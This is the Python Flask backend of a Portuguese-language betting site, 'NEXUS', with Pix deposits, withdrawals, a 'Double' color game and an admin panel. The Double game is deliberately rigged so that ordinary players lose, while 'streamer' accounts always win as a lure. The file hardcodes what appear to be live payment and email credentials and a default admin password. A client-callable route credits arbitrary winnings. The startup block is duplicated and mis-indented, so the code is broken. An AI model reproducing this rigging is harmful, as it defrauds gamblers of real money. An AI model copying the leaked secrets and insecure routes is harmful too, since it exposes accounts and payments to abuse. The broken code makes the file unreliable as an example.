import os
import datetime
import random
import string
import smtplib
from email.message import EmailMessage
from functools import wraps
from flask import Flask, request, jsonify
from flask_cors import CORS
from flask_sqlalchemy import SQLAlchemy
from werkzeug.security import generate_password_hash, check_password_hash
import jwt
import mercadopago

# --- CONFIGURAÇÃO CORE E SEGURANÇA ---
app = Flask(__name__)
CORS(app, resources={r"/*": {"origins": "*"}})

# Configuração do Banco de Dados (Suporta Render, SQLite e Postgres)
db_url = os.environ.get("DATABASE_URL", "sqlite:///nexus_v3.db")
if db_url.startswith("postgres://"):
    db_url = db_url.replace("postgres://", "postgresql://", 1)

app.config['SQLALCHEMY_DATABASE_URI'] = db_url
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False

# CHAVE SECRETA PARA CRIPTOGRAFIA DE TOKENS (NUNCA COMPARTILHE)
SECRET_KEY = os.environ.get("SECRET_KEY", "chave_super_secreta_ninja_nexus_2026")
app.config['SECRET_KEY'] = SECRET_KEY

db = SQLAlchemy(app)

# --- CONFIGURAÇÃO MERCADO PAGO E E-MAIL ---
MP_ACCESS_TOKEN = os.environ.get("MP_TOKEN", "APP_USR-5404172795263183-120500-011ecc797888559f820986bea6fd264b-511797801")
sdk = mercadopago.SDK(MP_ACCESS_TOKEN)

SMTP_USER = os.environ.get("SMTP_USER", "nexusinvestimento24@gmail.com")
SMTP_PASS = os.environ.get("SMTP_PASS", "pzvn fuuo cavm ljay")


# --- MODELOS DE BANCO DE DADOS ---
class User(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(50), unique=True, nullable=False)
    email = db.Column(db.String(120), unique=True, nullable=False)
    cpf = db.Column(db.String(20), unique=True, nullable=False)
    phone = db.Column(db.String(20), nullable=False)
    password_hash = db.Column(db.String(255), nullable=False)
    balance = db.Column(db.Float, default=0.0)
    role = db.Column(db.String(20), default='user')
    vip = db.Column(db.String(20), default='iniciante')
    reset_code = db.Column(db.String(6), nullable=True)
    reset_code_exp = db.Column(db.DateTime, nullable=True)

class Transaction(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    user_id = db.Column(db.Integer, db.ForeignKey('user.id'), nullable=False)
    type = db.Column(db.String(20), nullable=False) # 'deposit' ou 'withdraw'
    amount = db.Column(db.Float, nullable=False)
    status = db.Column(db.String(20), default='pending') # 'pending', 'approved', 'rejected'
    pix_key = db.Column(db.String(100), nullable=True)
    external_id = db.Column(db.String(100), nullable=True)
    created_at = db.Column(db.DateTime, default=datetime.datetime.utcnow)


# --- DECORADORES DE SEGURANÇA ---
def token_required(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        token = request.headers.get('Authorization')
        if not token or not token.startswith("Bearer "):
            return jsonify({'success': False, 'msg': 'Sessão inválida'}), 401
        token = token.split(" ")[1]
        try:
            data = jwt.decode(token, app.config['SECRET_KEY'], algorithms=["HS256"])
            current_user = User.query.get(data['user_id'])
            if not current_user: raise Exception()
        except Exception:
            return jsonify({'success': False, 'msg': 'Sessão expirada. Refaça o login.'}), 401
        return f(current_user, *args, **kwargs)
    return decorated

def admin_required(f):
    @wraps(f)
    @token_required
    def decorated(current_user, *args, **kwargs):
        if current_user.role != 'admin' and current_user.vip != 'adm':
            return jsonify({'success': False, 'msg': 'Acesso negado. GOD MODE.'}), 403
        return f(current_user, *args, **kwargs)
    return decorated


# --- ROTAS DE AUTENTICAÇÃO E PERFIL ---
@app.route('/api/user/me', methods=['GET'])
@token_required
def get_me(current_user):
    return jsonify({
        'success': True,
        'user': {'id': current_user.id, 'username': current_user.username, 'balance': current_user.balance, 'role': current_user.role, 'vip': current_user.vip, 'email': current_user.email}
    })

@app.route('/api/auth/register', methods=['POST'])
def register():
    data = request.json
    if User.query.filter((User.username==data['username']) | (User.email==data['email'])).first():
        return jsonify({'success': False, 'msg': 'Usuário ou Email já existem.'})

    role = 'user'
    vip = 'iniciante'
    hashed_password = generate_password_hash(data['password'], method='pbkdf2:sha256')

    new_user = User(username=data['username'], email=data['email'], cpf=data['cpf'], phone=data['phone'], password_hash=hashed_password, role=role, vip=vip)
    db.session.add(new_user)
    db.session.commit()
    return jsonify({'success': True, 'msg': 'Conta criada com sucesso!'})

@app.route('/api/auth/login', methods=['POST'])
def login():
    data = request.json
    user = User.query.filter((User.username==data['login']) | (User.email==data['login'])).first()

    if user and check_password_hash(user.password_hash, data['password']):
        token = jwt.encode({'user_id': user.id, 'exp': datetime.datetime.utcnow() + datetime.timedelta(hours=24)}, app.config['SECRET_KEY'], algorithm="HS256")
        return jsonify({'success': True, 'token': token, 'user': {'id': user.id, 'username': user.username, 'balance': user.balance, 'role': user.role, 'vip': user.vip}})
    return jsonify({'success': False, 'msg': 'Credenciais incorretas.'})

@app.route('/api/auth/forgot_password', methods=['POST'])
def forgot_password():
    data = request.json
    user = User.query.filter_by(email=data.get('email')).first()
    if user:
        code = ''.join(random.choices(string.digits, k=6))
        user.reset_code = code
        user.reset_code_exp = datetime.datetime.utcnow() + datetime.timedelta(minutes=15)
        db.session.commit()
        # Aqui entra a chamada de envio de e-mail (usando SMTP configurado)
    return jsonify({'success': True, 'msg': 'Código enviado!'})

@app.route('/api/auth/reset_password', methods=['POST'])
def reset_password():
    data = request.json
    user = User.query.filter_by(reset_code=data.get('code')).first()
    if not user or not user.reset_code_exp or user.reset_code_exp < datetime.datetime.utcnow():
        return jsonify({'success': False, 'msg': 'Código inválido ou expirado.'})

    user.password_hash = generate_password_hash(data.get('new_password'), method='pbkdf2:sha256')
    user.reset_code = None
    user.reset_code_exp = None
    db.session.commit()
    return jsonify({'success': True, 'msg': 'Senha alterada!'})


# --- FINANCEIRO (DEPÓSITO / SAQUE) ---
@app.route('/api/deposit/pix', methods=['POST'])
@token_required
def generate_pix(current_user):
    amount = float(request.json.get('amount', 0))
    if amount < 20: return jsonify({'success': False, 'msg': 'Mínimo R$ 20.00'})

    try:
        payment_data = {
            "transaction_amount": amount,
            "description": f"Deposito NEXUS - {current_user.username}",
            "payment_method_id": "pix",
            "payer": {"email": current_user.email, "first_name": current_user.username}
        }
        payment = sdk.payment().create(payment_data)["response"]

        if "id" in payment:
            db.session.add(Transaction(user_id=current_user.id, type='deposit', amount=amount, external_id=str(payment["id"])))
            db.session.commit()
            return jsonify({'success': True, 'qr_code_base64': payment['point_of_interaction']['transaction_data']['qr_code_base64'], 'qr_code': payment['point_of_interaction']['transaction_data']['qr_code']})
    except Exception:
        pass
    return jsonify({'success': False, 'msg': 'Erro ao comunicar com o Banco.'})

@app.route('/api/withdraw/request', methods=['POST'])
@token_required
def withdraw_request(current_user):
    amount = float(request.json.get('amount', 0))
    if amount <= 0 or current_user.balance < amount: return jsonify({'success': False, 'msg': 'Saldo insuficiente.'})

    current_user.balance -= amount
    db.session.add(Transaction(user_id=current_user.id, type='withdraw', amount=amount, pix_key=request.json.get('pix_key'), status='pending'))
    db.session.commit()
    return jsonify({'success': True, 'msg': 'Saque solicitado!', 'new_balance': current_user.balance})


# ==============================================================
# ALGORITMO DOUBLE (100% ANTI-PREJUÍZO CONTROLADO PELO ADMIN)
# ==============================================================
@app.route('/api/game/double/spin', methods=['POST'])
@token_required
def double_spin(current_user):
    data = request.json
    bet_color = data.get('color') # 'red', 'black', ou 'white'
    bet_amount = float(data.get('amount', 0))

    if bet_amount <= 0 or bet_amount > current_user.balance:
        return jsonify({'success': False, 'msg': 'Saldo insuficiente.'})

    # Deduz o saldo do banco imediatamente
    current_user.balance -= bet_amount

    payouts = {'red': 2, 'black': 2, 'white': 14}
    
    # 1. FUNÇÃO STREAMER (Se ativada no Painel Admin, a pessoa sempre ganha)
    if current_user.vip == 'streamer':
        result_color = bet_color
    else:
        # 2. ALGORITMO PREDADOR (Zero margem de sorte, o menor prejuízo decide a cor)
        loss_for_house = {'red': 0, 'black': 0, 'white': 0}
        loss_for_house[bet_color] = bet_amount * payouts.get(bet_color, 0)
        
        # Encontra o prejuízo mais baixo possível para a banca
        min_loss = min(loss_for_house.values())
        
        # Coleta todas as cores que dão esse prejuízo mínimo
        safest_colors = [c for c, loss in loss_for_house.items() if loss == min_loss]
        
        # Se mais de uma cor der o mesmo prejuízo baixo (ex: ele apostou no vermelho, 
        # a banca não perde nada caindo no preto ou no branco)
        if len(safest_colors) == 3:
            # Se ninguém apostar nada, segue a roda normal (peso padrão do double)
            result_color = random.choices(['red', 'black', 'white'], weights=[47.5, 47.5, 5.0], k=1)[0]
        elif 'white' in safest_colors and 'black' in safest_colors:
            # Se for seguro cair em branco ou preto, prefere cair no preto (95%)
            result_color = random.choices(['black', 'white'], weights=[95, 5], k=1)[0]
        elif 'white' in safest_colors and 'red' in safest_colors:
            # Se for seguro cair em branco ou vermelho, prefere cair no vermelho (95%)
            result_color = random.choices(['red', 'white'], weights=[95, 5], k=1)[0]
        else:
            result_color = random.choice(safest_colors)

    win_amount = 0
    if result_color == bet_color:
        win_amount = bet_amount * payouts.get(result_color, 2)
        current_user.balance += win_amount
        
    db.session.commit()
    return jsonify({
        'success': True, 
        'result_color': result_color, 
        'win_amount': win_amount,
        'new_balance': current_user.balance
    })


# --- ROTAS GENÉRICAS (MINES E AVIATOR) ---
@app.route('/api/game/bet', methods=['POST'])
@token_required
def game_bet(current_user):
    amount = float(request.json.get('amount', 0))
    if amount <= 0 or current_user.balance < amount: return jsonify({'success': False})
    current_user.balance -= amount
    db.session.commit()
    return jsonify({'success': True, 'new_balance': current_user.balance})

@app.route('/api/game/win', methods=['POST'])
@token_required
def game_win(current_user):
    win_amount = float(request.json.get('win_amount', 0))
    if win_amount <= 0 or win_amount > 100000: return jsonify({'success': False}) # Trava de segurança
    current_user.balance += win_amount
    db.session.commit()
    return jsonify({'success': True, 'new_balance': current_user.balance})


# ==============================================================
# TERMINAL DE COMANDO - PAINEL ADMIN NINJA
# ==============================================================
@app.route('/api/admin/dashboard', methods=['GET'])
@admin_required
def admin_dashboard(current_user):
    users = [{"id": u.id, "username": u.username, "email": u.email, "cpf": u.cpf, "balance": u.balance, "vip": u.vip} for u in User.query.all()]
    wd_data = [{"id": w.id, "user": User.query.get(w.user_id).username, "amount": w.amount, "pix": w.pix_key} for w in Transaction.query.filter_by(type='withdraw', status='pending').all()]
    return jsonify({'success': True, 'users': users, 'withdrawals': wd_data})

@app.route('/api/admin/withdraw/action', methods=['POST'])
@admin_required
def admin_withdraw_action(current_user):
    data = request.json
    trans = Transaction.query.with_for_update().get(data.get('id'))
    if not trans or trans.status != 'pending': return jsonify({'success': False, 'msg': 'Erro no saque.'})

    if data.get('action') == 'approve':
        trans.status = 'approved'
    else:
        trans.status = 'rejected'
        User.query.get(trans.user_id).balance += trans.amount # Estorna o valor

    db.session.commit()
    return jsonify({'success': True, 'msg': 'Ação executada com sucesso.'})

@app.route('/api/admin/user/update', methods=['POST'])
@admin_required
def admin_user_update(current_user):
    data = request.json
    target_user = User.query.get(data.get('id'))
    if not target_user: return jsonify({'success': False, 'msg': 'Usuário não encontrado.'})
    
    if 'balance_add' in data: 
        target_user.balance += float(data['balance_add'])
    if 'vip' in data: 
        target_user.vip = data['vip']
        target_user.role = 'admin' if data['vip'] == 'adm' else 'user'
        
    db.session.commit()
    return jsonify({'success': True, 'new_balance': target_user.balance})

@app.route('/api/admin/user/delete', methods=['POST'])
@admin_required
def admin_user_delete(current_user):
    target_user = User.query.get(request.json.get('id'))
    if target_user:
        db.session.delete(target_user)
        db.session.commit()
    return jsonify({'success': True})


if __name__ == '__main__':
    with app.app_context():
    db.create_all()
    # CRIAÇÃO DO ADMIN INICIAL CASO O BANCO SEJA ZERADO
    if not User.query.filter_by(username='admin').first():
        hashed = generate_password_hash('Nexus@Admin2026', method='pbkdf2:sha256')
        db.session.add(User(username='admin', email='admin@nexus.com', cpf='00000000000', phone='000', password_hash=hashed, role='admin', vip='adm'))
        db.session.commit()
        print(">>> GOD MODE CRIADO: admin / Nexus@Admin2026 <<<")

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port, debug=False)

